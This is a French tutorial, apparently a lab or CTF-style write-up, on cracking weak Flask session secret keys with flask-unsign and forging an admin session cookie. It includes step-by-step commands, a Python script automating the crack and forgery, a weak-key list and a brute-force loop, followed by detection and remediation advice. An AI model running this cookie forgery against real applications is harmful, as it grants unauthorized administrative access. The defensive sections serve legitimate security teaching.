# 🍪 Cracking de clé de session Flask

> **Auteur :** [@spectramz](https://github.com/exploit4040) — *"Le roi des pirates"* 🏴‍☠️
> **Catégorie :** Web Exploitation — Framework Flask
> **Difficulté :** ⭐⭐☆☆☆
> **Tags :** `flask`, `session`, `secret-key`, `flask-unsign`, `cookie-forgery`

---

## 📌 Table des matières

- [Contexte](#-contexte)
- [Principe de l'attaque](#-principe-de-lattaque)
- [Prérequis](#-prérequis)
- [Exploitation pas à pas](#-exploitation-pas-à-pas)
- [Script Python automatisé](#-script-python-automatisé)
- [Liste de clés courantes](#-liste-de-clés-courantes)
- [Détection](#-détection)
- [Remédiation](#-remédiation)
- [Références](#-références)

---

## 🎯 Contexte

**Flask** est un micro-framework Python très populaire. Il gère les sessions via un **cookie signé** (et non chiffré) avec une clé secrète (`app.secret_key`).

Le cookie Flask a la structure suivante :


<base64(payload)>.<timestamp>.<signature>
text


- Le **payload** est en JSON (encodé en base64)
- La **signature** est un HMAC-SHA1 calculé avec `app.secret_key`

**Propriété importante** : le payload est **lisible** par n'importe qui (base64). Seule la signature dépend de la clé. Donc si on trouve la clé, on peut **forger** n'importe quel cookie.

---

## 🧠 Principe de l'attaque

Comme pour les JWT HMAC, la sécurité de la session Flask repose sur le **secret** `app.secret_key`. Si ce secret est :

- Faible (`secret`, `password`, `123456`…)
- Hardcodé dans le code
- Choisi parmi une liste connue (`['snickerdoodle', 'chocolate chip', ...]`)

… alors il peut être **cassé par force brute** avec `flask-unsign`.

Une fois la clé trouvée, on forge un cookie admin.

---

## 📋 Prérequis

- Un cookie de session Flask valide
- **flask-unsign** installé (`pip install flask-unsign`)
- Une **wordlist** (`rockyou.txt`, SecLists…)

---

## 🛠️ Exploitation pas à pas

### Étape 1 — Récupérer le cookie

**Via le navigateur** :

1. F12 → **Application** → **Cookies**
2. Trouver le cookie nommé `session`
3. Copier sa valeur

**Exemple** :

session=eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.arkdGg._uBS-m04WrfiUZQr6WNEXn30JpI
text


### Étape 2 — Décoder le cookie

```bash
flask-unsign --decode --cookie "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.arkdGg._uBS-m04WrfiUZQr6WNEXn30JpI"

Résultat :
text

{'admin': 'false', 'username': 'guest'}

On voit qu'il y a un champ admin avec la valeur false. L'objectif est de le passer à true.
Étape 3 — Cracker la clé secrète
bash

flask-unsign --unsign \
  --cookie "eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.arkdGg._uBS-m04WrfiUZQr6WNEXn30JpI" \
  --wordlist /usr/share/wordlists/rockyou.txt \
  --no-literal-eval \
  --threads 8

Options importantes :
Option	Rôle
--unsign	Mode cracking
--cookie	Cookie Flask à casser
--wordlist	Wordlist
--no-literal-eval	Crucial : évite le crash sur les entiers
--threads	Nombre de threads

Pourquoi --no-literal-eval ?

Sans cette option, flask-unsign essaie d'évaluer chaque mot du dictionnaire comme du code Python. Quand il tombe sur 123456, il l'interprète comme un entier (int), ce qui provoque une erreur :
text

FlaskUnsignException: Secret must be a string-type (bytes, str)
and received 'int'.

Avec --no-literal-eval, tous les mots sont traités comme des chaînes brutes, ce qui évite le crash.

Résultat :
text

[*] Session decodes to: {'admin': 'false', 'username': 'guest'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 70144 attempts
b's3cr3t'

Étape 4 — Forger un nouveau cookie
bash

flask-unsign --sign \
  --cookie "{'admin': True, 'username': 'admin'}" \
  --secret 's3cr3t' \
  --no-literal-eval

⚠️ Attention aux types !

Le cookie original contient admin: 'false' (une chaîne). Il faut donc envoyer admin: 'true' (chaîne) et non admin: True (booléen), sinon la comparaison côté serveur échoue.

Si admin: 'false' (chaîne) :
bash

flask-unsign --sign --cookie "{'admin': 'true', 'username': 'admin'}" --secret 's3cr3t' --no-literal-eval

Si admin: False (booléen) :
bash

flask-unsign --sign --cookie "{'admin': True, 'username': 'admin'}" --secret 's3cr3t' --no-literal-eval

Étape 5 — Utiliser le cookie

Avec curl :
bash

curl http://<cible>/admin \
  -b "session=<FORGED_COOKIE>"

Dans le navigateur :

    F12 → Application → Cookies

    Remplacer la valeur du cookie session

    Rafraîchir la page

🤖 Script Python automatisé
python

#!/usr/bin/env python3
"""
Cracking + forge de cookie Flask.
Auteur : SpectraMz
"""
import subprocess
import sys
import re

def crack_flask_cookie(cookie: str, wordlist: str) -> str:
    """Crack la clé secrète du cookie Flask."""
    print(f"[*] Cracking avec {wordlist}...")

    result = subprocess.run(
        [
            "flask-unsign", "--unsign",
            "--cookie", cookie,
            "--wordlist", wordlist,
            "--no-literal-eval",
            "--threads", "16"
        ],
        capture_output=True, text=True
    )

    # Extraire la clé
    match = re.search(r"Found secret key after \d+ attempts\s*\n?b?'([^']+)'", result.stdout)
    if match:
        secret = match.group(1)
        print(f"[+] Secret trouvé : {secret}")
        return secret
    else:
        print(f"[-] Secret non trouvé")
        print(result.stdout)
        return None

def forge_cookie(secret: str, payload: str) -> str:
    """Forge un nouveau cookie Flask."""
    result = subprocess.run(
        [
            "flask-unsign", "--sign",
            "--cookie", payload,
            "--secret", secret,
            "--no-literal-eval"
        ],
        capture_output=True, text=True
    )
    cookie = result.stdout.strip().split("\n")[-1]
    print(f"[+] Cookie forgé : {cookie[:80]}...")
    return cookie

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <COOKIE> <WORDLIST>")
        sys.exit(1)

    cookie = sys.argv[1]
    wordlist = sys.argv[2]

    secret = crack_flask_cookie(cookie, wordlist)
    if secret:
        # Adapter le payload selon les types du cookie original
        forged = forge_cookie(secret, "{'admin': True, 'username': 'admin'}")
        print(f"\n[+] Cookie final :\n{forged}")
        print(f"\n[+] Utilisation :")
        print(f"    curl http://<cible>/admin -b 'session={forged}'")

Utilisation :
bash

python3 flask_crack.py "eyJhZG1pbiI6ImZhbHNlIiwi..." /usr/share/wordlists/rockyou.txt

📋 Liste de clés courantes

Si rockyou.txt échoue, tester ces clés manuellement :
text

secret
password
admin
flask
s3cr3t
cookie
session
123456
changeme
root
test
dev
development
key
supersecret
mysecret
jwt-secret
jwt_secret
flask-secret
flask_secret
app-secret
app_secret
default
insecure

Script de test rapide :
bash

for key in secret password admin flask s3cr3t cookie session 123456 changeme root test; do
  echo -n "Test '$key' ... "
  flask-unsign --unsign --cookie "eyJhZG1pbiI6ImZhbHNlIiwi..." --secret "$key" --no-literal-eval 2>/dev/null && break || echo "non"
done

🔍 Détection
Côté serveur

    Surveiller les cookies dont la signature ne correspond pas à la clé attendue

    Alerter si le payload contient des valeurs sensibles modifiées

    Journaliser les tentatives d'accès à /admin

Côté attaquant

    Décoder le cookie pour voir les claims

    Tester les clés courantes avant de lancer un brute-force complet

    Adapter le payload aux types du cookie original

🛡️ Remédiation
Code vulnérable
python

# ❌ Clé faible hardcodée
app.secret_key = "secret"

# ❌ Clé choisie parmi une liste
import random
app.secret_key = random.choice(["snickerdoodle", "chocolate chip"])

Code sécurisé
python

import secrets

# ✅ Clé robuste générée aléatoirement (256 bits)
app.secret_key = secrets.token_hex(32)

# ✅ Ou chargée depuis l'environnement
import os
app.secret_key = os.environ["FLASK_SECRET_KEY"]

Règles d'or
Règle	Détail
256 bits minimum	secrets.token_hex(32)
Jamais dans le code	Variable d'environnement
Rotation périodique	Tous les 90 jours
Unique par environnement	Dev ≠ Staging ≠ Prod
Ne jamais utiliser de liste	Pas de random.choice()
Config sécurisée (extrait)
python

# config.py
import os
import secrets

class Config:
    SECRET_KEY = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(32)
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SECURE = True       # HTTPS uniquement
    SESSION_COOKIE_SAMESITE = "Strict"
    PERMANENT_SESSION_LIFETIME = 3600  # 1 heure

📚 Références

    flask-unsign — Paradoxis

    Flask — Documentation sessions

    OWASP — Session Management Cheat Sheet

    CWE-330 — Use of Insufficiently Random Values

<p align="center"> <b>🏴‍☠️ SpectraMz — Stay Curious, Hack Ethically</b> </p> ```
